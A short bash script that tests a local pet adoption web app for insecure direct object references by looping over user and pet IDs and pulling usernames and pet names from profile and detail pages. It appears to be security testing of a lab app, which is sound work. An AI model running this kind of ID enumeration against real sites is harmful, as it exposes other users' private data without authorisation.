#!/bin/bash
# IDOR Testing Script

echo "Testing IDOR Vulnerabilities..."

for i in {1..10}; do
    echo "Testing User ID: $i"
    curl -s "http://localhost/pet_adoption/profile.php?id=$i" | grep -o "Username.*" | head -1
done

for i in {1..10}; do
    echo "Testing Pet ID: $i"
    curl -s "http://localhost/pet_adoption/pet_details.php?id=$i" | grep -o "Pet Name.*" | head -1
done
